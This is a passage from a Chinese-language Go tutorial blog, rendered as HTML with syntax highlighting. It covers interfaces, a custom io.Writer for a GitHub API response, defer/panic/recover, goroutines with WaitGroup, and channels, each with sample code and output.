&amp;stu  <span class="comment">// 接口转为实例</span></span><br><span class="line">fmt.Println(p.getName())</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wk = Worker&#123;</span><br><span class="line">name: <span class="string">&quot;Ken&quot;</span>,</span><br><span class="line">gender: <span class="string">&quot;Male&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p = &amp;wk  <span class="comment">//接口转为实例</span></span><br><span class="line">fmt.Println(p.getName())</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果定义了一个没有任何方法的空接口，那么这个接口可以表示任意类型</span></span><br><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">m[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;Alice&quot;</span></span><br><span class="line">m[<span class="string">&quot;age&quot;</span>] = <span class="number">19</span></span><br><span class="line">m[<span class="string">&quot;score&quot;</span>] = [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">98</span>, <span class="number">99</span>, <span class="number">85</span>&#125;</span><br><span class="line">fmt.Println(m)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Tom</span><br><span class="line">Ken</span><br><span class="line">map[age:19 name:Alice score:[98 99 85]]</span><br></pre></td></tr></table></figure><p>怎样判定一个数据类型的某一个方法实现的就是某个接口类型中的某个方法呢？</p><p>这有两个充分必要条件，一个是“两个方法的签名需要完全一致”，另一个是“两个方法的名称要一模一样”。</p><p>两个方法的签名需要完全一致，这就是表示方法的实现的形参、顺序、返回值必须一致，才会有相同的方法签名。</p><h3 id="扩展现有的方法"><a href="#扩展现有的方法" class="headerlink" title="扩展现有的方法"></a>扩展现有的方法</h3><p>现有的实现，io.Copy，将http get回来的数据打印到终端上。现在我们希望重载这个Copy方法，以我们需要的方式打印返回结果。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    resp, err := http.Get(<span class="string">&quot;https://api.github.com/users/microsoft/repos?page=15&amp;per_page=5&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Error:&quot;</span>, err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    io.Copy(os.Stdout, resp.Body)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;id&quot;:276496384,&quot;node_id&quot;:&quot;MDEwOlJlcG9zaXRvcnkyNzY0OTYzODQ&#x3D;&quot;,&quot;name&quot;:&quot;-Users-deepakdahiya-Desktop-juhibubash-test21zzzzzzzzzzz&quot;,&quot;full_name&quot;:&quot;microsoft&#x2F;-Users-deepakdahiya-Desktop-juhibubash-test21zzzzzzzzzzz&quot;,&quot;private&quot;:false,&quot;owner&quot;:&#123;&quot;login&quot;:&quot;microsoft&quot;,&quot;id&quot;:6154722,&quot;node_id&quot;:&quot;MDEyOk9yZ2FuaXphdGlvbjYxNTQ3MjI&#x3D;&quot;,&quot;avatar_url&quot;:&quot;https:&#x2F;&#x2F;avatars2.githubusercontent.com&#x2F;u&#x2F;6154722?v&#x3D;4&quot;,&quot;gravatar_id&quot;:&quot;&quot;,&quot;url&quot;:&quot;https:&#x2F;&#x2F;api.github.com&#x2F;users&#x2F;microsoft&quot;,&quot;html_url&quot;:&quot;https:&#x2F;&#x2F;github.com&#x2F;micro</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>io.Copy的实现</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Copy</span><span class="params">(dst Writer, src Reader)</span> <span class="params">(written <span class="keyword">int64</span>, err error)</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Writer <span class="keyword">interface</span> &#123;</span><br><span class="line">    Write(p []<span class="keyword">byte</span>) (n <span class="keyword">int</span>, err error)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到Writer是空接口，里面实现了write方法。因此我们重新定义一个Writer接口，幷实现这个Write方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> GitHubResponse []<span class="keyword">struct</span> &#123;</span><br><span class="line">FullName <span class="keyword">string</span> <span class="string">`json:&quot;full_name&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> customWriter <span class="keyword">struct</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w customWriter)</span> <span class="title">Write</span><span class="params">(p []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> resp GitHubResponse</span><br><span class="line">json.Unmarshal(p, &amp;resp)</span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> resp &#123;</span><br><span class="line">fmt.Println(r.FullName)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">len</span>(p), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    resp, err := http.Get(<span class="string">&quot;https://api.github.com/users/microsoft/repos?page=15&amp;per_page=5&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Error:&quot;</span>, err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">writer := customWriter&#123;&#125;</span><br><span class="line">    io.Copy(writer, resp.Body)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">microsoft/aed-content-nasa-su20</span><br><span class="line">microsoft/aed-external-learn-template</span><br><span class="line">microsoft/aed-<span class="keyword">go</span>-learn-content</span><br><span class="line">microsoft/aed-learn-template</span><br></pre></td></tr></table></figure><h2 id="defer和panic"><a href="#defer和panic" class="headerlink" title="defer和panic"></a>defer和panic</h2><p>defer 语句会推迟函数（包括任何参数）的运行，直到包含 defer 语句的函数完成。 通常情况下，当你想要避免忘记任务（例如关闭文件或运行清理进程）时，可以推迟某个函数的运行。</p><p>内置 panic() 函数会停止正常的控制流。 所有推迟的函数调用都会正常运行。 进程会在堆栈中继续，直到所有函数都返回。 然后，程序会崩溃并记录日志消息。 此消息包含错误和堆栈跟踪，有助于诊断问题的根本原因。</p><p>这是panic和defer组合使用的例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">gg(<span class="number">0</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;Program finished succ!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gg</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> (i &gt; <span class="number">3</span>) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;throw panic!!!&quot;</span>)</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Panic in gg&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Defer in gg, i=&quot;</span>, i)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;Printing in gg. i=&quot;</span>, i)</span><br><span class="line">gg(i+<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">rinting in gg. i&#x3D; 0</span><br><span class="line">Printing in gg. i&#x3D; 1</span><br><span class="line">Printing in gg. i&#x3D; 2</span><br><span class="line">Printing in gg. i&#x3D; 3</span><br><span class="line">throw panic!!!</span><br><span class="line">Defer in gg, i&#x3D; 3</span><br><span class="line">Defer in gg, i&#x3D; 2</span><br><span class="line">Defer in gg, i&#x3D; 1</span><br><span class="line">Defer in gg, i&#x3D; 0</span><br><span class="line">panic: Panic in gg</span><br><span class="line"></span><br><span class="line">goroutine 1 [running]:</span><br><span class="line">main.gg(0x4)</span><br><span class="line">        &#x2F;Users&#x2F;junshili&#x2F;Desktop&#x2F;golearn&#x2F;main.go:18 +0x195</span><br><span class="line">main.gg(0x3)</span><br><span class="line">        &#x2F;Users&#x2F;junshili&#x2F;Desktop&#x2F;golearn&#x2F;main.go:25 +0xfe</span><br><span class="line">main.gg(0x2)</span><br><span class="line">        &#x2F;Users&#x2F;junshili&#x2F;Desktop&#x2F;golearn&#x2F;main.go:25 +0xfe</span><br><span class="line">main.gg(0x1)</span><br><span class="line">        &#x2F;Users&#x2F;junshili&#x2F;Desktop&#x2F;golearn&#x2F;main.go:25 +0xfe</span><br><span class="line">main.gg(0x0)</span><br><span class="line">        &#x2F;Users&#x2F;junshili&#x2F;Desktop&#x2F;golearn&#x2F;main.go:25 +0xfe</span><br><span class="line">main.main()</span><br><span class="line">        &#x2F;Users&#x2F;junshili&#x2F;Desktop&#x2F;golearn&#x2F;main.go:11 +0x2e</span><br></pre></td></tr></table></figure><p>注意输出“Defer in gg”是采用逆序（后进先出）。最后的<code>fmt.Println(&quot;Program finished succ!&quot;)</code>并没有执行，这是因为panic出现后，程序就会退出。</p><h2 id="recover"><a href="#recover" class="headerlink" title="recover"></a>recover</h2><p>Go 提供内置函数 recover()，允许你在出现紧急状况之后重新获得控制权。 只能在已推迟的函数中使用此函数。 如果调用 recover() 函数，则在正常运行的情况下，它会返回 nil，没有任何其他作用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> r := <span class="built_in">recover</span>(); r != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Recovered in main&quot;</span>, r)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">gg(<span class="number">0</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;Program finished succ!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gg</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> (i &gt; <span class="number">3</span>) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;throw panic!!!&quot;</span>)</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Panic in gg&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Defer in gg, i=&quot;</span>, i)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;Printing in gg. i=&quot;</span>, i)</span><br><span class="line">gg(i+<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Printing in gg. i&#x3D; 0</span><br><span class="line">Printing in gg. i&#x3D; 1</span><br><span class="line">Printing in gg. i&#x3D; 2</span><br><span class="line">Printing in gg. i&#x3D; 3</span><br><span class="line">throw panic!!!</span><br><span class="line">Defer in gg, i&#x3D; 3</span><br><span class="line">Defer in gg, i&#x3D; 2</span><br><span class="line">Defer in gg, i&#x3D; 1</span><br><span class="line">Defer in gg, i&#x3D; 0</span><br><span class="line">Recovered in main Panic in gg</span><br></pre></td></tr></table></figure><p>这个版本跟上一个panic+defer的版本相比，输出少了堆栈信息，控制流同样是中断了，输出顺序是一样的。</p><p>==panic 和 recover 的组合是 Go 处理异常的惯用方式。 其他编程语言使用 try/catch 块。 Go 首选此处所述的方法。==</p><h2 id="并发编程goroutine"><a href="#并发编程goroutine" class="headerlink" title="并发编程goroutine"></a>并发编程goroutine</h2><p>编写并发程序时最大的问题是在进程之间共享数据。Go 是通过 channel 来回传递数据的。 这意味着只有一个活动 (goroutine) 有权访问数据，设计上不存在争用条件。</p><p>单线程写法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// gorountine 并发编程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">download</span><span class="params">(url <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;start donwload,url=&quot;</span>, url)</span><br><span class="line">time.Sleep(time.Second * <span class="number">5</span>)  <span class="comment">// 模拟耗时</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;start all download, time=&quot;</span>, time.Now().Format(<span class="string">&quot;2006-01-02 15:04:05&quot;</span>))</span><br><span class="line">t1 := time.Now()</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">download(<span class="string">&quot;www.test_go.com/index&quot;</span> + <span class="keyword">string</span>(i + <span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">&#125;</span><br><span class="line">t2 := time.Since(t1) / time.Second</span><br><span class="line">fmt.Printf(<span class="string">&quot;download done, time_use=%ds\n&quot;</span>, t2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">start all download, time&#x3D; 2021-04-29 23:45:46</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index0</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index1</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index2</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index3</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index4</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index5</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index6</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index7</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index8</span><br><span class="line">start donwload,url&#x3D; www.test_go.</span><br></pre></td></tr></table></figure><p>gorountine写法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// goroutine 并发编程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">download</span><span class="params">(url <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;start donwload,url=&quot;</span>, url)</span><br><span class="line">time.Sleep(time.Second * <span class="number">5</span>)  <span class="comment">// 模拟耗时</span></span><br><span class="line">wg.Done()  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;start all download, time=&quot;</span>, time.Now().Format(<span class="string">&quot;2006-01-02 15:04:05&quot;</span>))</span><br><span class="line">t1 := time.Now()</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)  <span class="comment">// 为 wg 添加一个计数，wg.Done()，减去一个计数。</span></span><br><span class="line"><span class="keyword">go</span> download(<span class="string">&quot;www.test_go.com/index&quot;</span> + <span class="keyword">string</span>(i + <span class="string">&#x27;0&#x27;</span>))  <span class="comment">//启动新的协程并发执行 download 函数。</span></span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()  <span class="comment">//等待所有的协程执行结束。</span></span><br><span class="line">t2 := time.Since(t1) / time.Second</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;download done, time_use=%ds\n&quot;</span>, t2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">start all download, time&#x3D; 2021-04-29 23:49:27</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index9</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index0</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index1</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index2</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index6</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index7</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index8</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index3</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index4</span><br><span class="line">start donwload,url&#x3D; www.test_go.com&#x2F;index5</span><br><span class="line">download done, time_use&#x3D;5s</span><br></pre></td></tr></table></figure><p>许多程序喜欢使用匿名函数来创建 goroutine，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">func main()&#123;</span><br><span class="line">    login()</span><br><span class="line">    go func() &#123;</span><br><span class="line">        launch()</span><br><span class="line">    &#125;()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用channel进行协程间通信"><a href="#利用channel进行协程间通信" class="headerlink" title="利用channel进行协程间通信"></a>利用channel进行协程间通信</h2><p>Channel是Go中的一个核心类型，你可以把它看成一个管道，通过它并发核心单元就可以发送或者接收数据进行通讯(communication)。</p><p>Channel可以作为一个先入先出(FIFO)的队列，接收的数据和发送的数据的顺序是一致的。</p><p>channel使用的语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ch &lt;- x &#x2F;&#x2F; sends (or write) x through channel ch</span><br><span class="line">x &#x3D; &lt;-ch &#x2F;&#x2F; x receives (or reads) data sent to the channel ch</span><br><span class="line">&lt;-ch &#x2F;&#x2F; receives data, but the result is discarded</span><br></pre></td></tr></table></figure><p>往一个已经被close的channel中继续发送数据会导致run-time panic。</p><p>往nil channel中发送、接收数据会一致被阻塞着。</p><p>从一个被close的channel中接收数据不会被阻塞，而是立即返回，接收完已发送的数据后会返回元素类型的零值(zero value)。</p><p>如前所述，你可以使用一个额外的返回参数来检查channel是否关闭。如果OK 是false，表明接收的x是产生的零值，这个channel被关闭了或者为空。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x, ok :&#x3D; &lt;-ch</span><br></pre></td></tr></table></figure><p>循环处理channel的消息,如果通过range读取，channel关闭后for循环会跳出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i :&#x3D; range c &#123;</span><br><span class="line">    fmt.Println(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// gorountine 并发编程，利用channel进行协程间通信</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ch = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="number">10</span>) <span class="comment">// 创建大小为10 的缓冲信道</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果没有设置容量，或者容量设置为0, 说明Channel没有缓存，只有sender和receiver都准备好了后它们的通讯(communication)才会发生(Blocking)。如果设置了缓存，就有可能不发生阻塞， </span></span><br><span class="line"><span class="comment">//只有buffer满了后 send才会阻塞， 而只有缓存空了后receive才会阻塞。一个nil channel不会通信。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">download</span><span class="params">(url <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;start donwload,url=&quot;</span>, url)</span><br><span class="line">time.Sleep(time.Second * <span class="number">5</span>)  <span 